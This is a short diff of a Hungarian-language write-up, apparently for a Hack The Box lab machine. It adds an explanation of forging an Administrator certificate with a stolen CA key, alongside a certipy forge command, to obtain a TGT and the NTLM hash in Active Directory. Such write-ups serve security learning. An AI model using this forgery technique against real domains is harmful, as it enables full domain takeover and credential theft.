@@ -334,6 +334,7 @@ download ca.pfx
 ```
 
 ## Admin tanúsítvány hamisítása
+A hamisított tanúsítvány segítségével hitelesítjük magunkat az AD felé, mintha az Administrator lennénk – ezáltal teljes TGT-t kapunk, amivel NTLM hash is lekérhető.
 
 ```bash
 certipy forge -ca-pfx ca.pfx -upn 'administrator@certificate.htb' -out forged_admin.pfx
